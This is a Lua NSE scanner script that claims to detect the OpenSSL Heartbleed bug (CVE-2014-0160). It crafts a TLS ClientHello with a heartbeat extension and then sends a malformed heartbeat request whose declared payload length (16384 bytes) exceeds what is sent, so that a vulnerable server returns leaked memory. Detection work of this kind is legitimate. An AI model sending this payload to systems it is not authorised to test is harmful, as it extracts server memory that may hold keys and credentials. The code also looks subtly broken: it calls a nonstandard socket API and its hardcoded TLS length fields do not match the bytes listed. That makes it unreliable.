-- SSL Heartbleed Vulnerability Detection (CVE-2014-0160)
-- Tests for the OpenSSL Heartbleed bug
-- @output
-- 443/tcp open  https
-- | ssl-heartbleed:
-- |   VULNERABLE:
-- |   The Heartbleed Bug is a serious vulnerability in OpenSSL
-- |     State: VULNERABLE
-- |     Risk: High
-- |       OpenSSL versions 1.0.1 through 1.0.1f contain a flaw in its implementation
-- |       of the TLS/DTLS heartbeat functionality. This flaw allows an attacker to
-- |       read up to 64KB of memory from the server.
-- |     
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
-- |_      http://heartbleed.com/

description = [[
Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).

The script performs a TLS handshake and sends a malformed heartbeat request. 
If the server responds with more data than it should, it's vulnerable.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "safe", "default"}

portrule = function(host, port)
    return port.service == "https" or port.service == "ssl" or
           port.number == 443 or port.number == 8443 or
           port.number == 993 or port.number == 995 or port.number == 465
end

action = function(host, port)
    local socket = nse.new_socket()
    socket:set_timeout(10000)
    
    local status, err = socket:connect(host.ip, port.number)
    if not status then
        return nil
    end
    
    -- Send TLS Client Hello
    local client_hello = build_client_hello()
    status, err = socket:send(client_hello)
    if not status then
        socket:close()
        return nil
    end
    
    -- Receive Server Hello, Certificate, Server Hello Done
    local status, server_hello = socket:receive()
    if not status or not server_hello then
        socket:close()
        return nil
    end
    
    -- Check if heartbeat extension is supported
    if not server_hello:find("\x00\x0f") then  -- Heartbeat extension (15)
        socket:close()
        return "Heartbeat extension not supported"
    end
    
    -- Send malformed Heartbeat Request
    local heartbeat = build_heartbeat_request()
    status, err = socket:send(heartbeat)
    if not status then
        socket:close()
        return nil
    end
    
    -- Receive Heartbeat Response
    local status, response = socket:receive()
    socket:close()
    
    if not status or not response then
        return "Not vulnerable (no heartbeat response)"
    end
    
    -- Check response size
    -- Vulnerable servers will return more data than requested
    if #response > 100 then
        -- Look for actual leaked memory content
        local has_leaked_data = false
        
        -- Check for printable strings that shouldn't be there
        local printable_count = 0
        for i = 1, #response do
            local byte = string.byte(response, i)
            if byte >= 32 and byte <= 126 then
                printable_count = printable_count + 1
            end
        end
        
        -- If more than 20% is printable text, likely leaked memory
        if printable_count > (#response * 0.2) then
            has_leaked_data = true
        end
        
        if has_leaked_data then
            local result = "VULNERABLE:\n"
            result = result .. "The Heartbleed Bug is a serious vulnerability in OpenSSL\n"
            result = result .. "  State: VULNERABLE\n"
            result = result .. "  Risk: High\n"
            result = result .. "    OpenSSL versions 1.0.1 through 1.0.1f contain a flaw in its implementation\n"
            result = result .. "    of the TLS/DTLS heartbeat functionality. This flaw allows an attacker to\n"
            result = result .. "    read up to 64KB of memory from the server.\n"
            result = result .. "  \n"
            result = result .. "  Leaked data size: " .. #response .. " bytes\n"
            result = result .. "  References:\n"
            result = result .. "    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160\n"
            result = result .. "    http://heartbleed.com/"
            return result
        end
    end
    
    return "Not vulnerable to Heartbleed"
end

-- Build TLS Client Hello with Heartbeat extension
function build_client_hello()
    -- TLS Record Layer
    local record = "\x16"        -- ContentType: Handshake
    record = record .. "\x03\x02"  -- Version: TLS 1.1
    record = record .. "\x00\xdc"  -- Length
    
    -- Handshake Protocol
    local handshake = "\x01"       -- HandshakeType: Client Hello
    handshake = handshake .. "\x00\x00\xd8"  -- Length
    handshake = handshake .. "\x03\x02"      -- Version: TLS 1.1
    
    -- Random (32 bytes)
    local random = ""
    for i = 1, 32 do
        random = random .. string.char(math.random(0, 255))
    end
    handshake = handshake .. random
    
    -- Session ID (empty)
    handshake = handshake .. "\x00"
    
    -- Cipher Suites
    handshake = handshake .. "\x00\x66"  -- Length: 102 bytes (51 suites)
    handshake = handshake .. "\xc0\x14\xc0\x0a\xc0\x22\xc0\x21"
    handshake = handshake .. "\x00\x39\x00\x38\x00\x88\x00\x87"
    handshake = handshake .. "\xc0\x0f\xc0\x05\x00\x35\x00\x84"
    handshake = handshake .. "\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b"
    handshake = handshake .. "\x00\x16\x00\x13\xc0\x0d\xc0\x03"
    handshake = handshake .. "\x00\x0a\xc0\x13\xc0\x09\xc0\x1f"
    handshake = handshake .. "\xc0\x1e\x00\x33\x00\x32\x00\x9a"
    handshake = handshake .. "\x00\x99\x00\x45\x00\x44\xc0\x0e"
    handshake = handshake .. "\xc0\x04\x00\x2f\x00\x96\x00\x41"
    handshake = handshake .. "\xc0\x11\xc0\x07\xc0\x0c\xc0\x02"
    handshake = handshake .. "\x00\x05\x00\x04\x00\x15\x00\x12"
    handshake = handshake .. "\x00\x09\x00\x14\x00\x11\x00\x08"
    handshake = handshake .. "\x00\x06\x00\x03\x00\xff"
    
    -- Compression Methods
    handshake = handshake .. "\x01\x00"  -- Length: 1, Method: NULL
    
    -- Extensions
    handshake = handshake .. "\x00\x49"  -- Extensions length
    
    -- Heartbeat extension
    handshake = handshake .. "\x00\x0f"  -- Extension type: Heartbeat (15)
    handshake = handshake .. "\x00\x01"  -- Length: 1
    handshake = handshake .. "\x01"      -- Mode: peer_allowed_to_send
    
    -- Server Name extension
    handshake = handshake .. "\x00\x00"  -- Extension type: server_name (0)
    handshake = handshake .. "\x00\x0e"  -- Length
    handshake = handshake .. "\x00\x0c\x00\x00\x09localhost"
    
    -- Other standard extensions
    handshake = handshake .. "\x00\x0b\x00\x04\x03\x00\x01\x02"  -- EC point formats
    handshake = handshake .. "\x00\x0a\x00\x1c\x00\x1a\x00\x17"  -- Supported groups
    handshake = handshake .. "\x00\x19\x00\x1c\x00\x1b\x00\x18"
    handshake = handshake .. "\x00\x1a\x00\x16\x00\x0e\x00\x0d"
    handshake = handshake .. "\x00\x0b\x00\x0c\x00\x09\x00\x0a"
    handshake = handshake .. "\x00\x23\x00\x00"                  -- Session ticket
    handshake = handshake .. "\x00\x0d\x00\x20\x00\x1e\x06\x01"  -- Signature algorithms
    handshake = handshake .. "\x06\x02\x06\x03\x05\x01\x05\x02"
    handshake = handshake .. "\x05\x03\x04\x01\x04\x02\x04\x03"
    handshake = handshake .. "\x03\x01\x03\x02\x03\x03\x02\x01"
    handshake = handshake .. "\x02\x02\x02\x03"
    
    return record .. handshake
end

-- Build malformed Heartbeat Request
function build_heartbeat_request()
    -- TLS Record
    local record = "\x18"        -- ContentType: Heartbeat (24)
    record = record .. "\x03\x02"  -- Version: TLS 1.1
    record = record .. "\x00\x03"  -- Length: 3 bytes
    
    -- Heartbeat Request
    local heartbeat = "\x01"       -- Type: Request (1)
    heartbeat = heartbeat .. "\x40\x00"  -- Payload length: 16384 (but we send much less)
    
    return record .. heartbeat
end
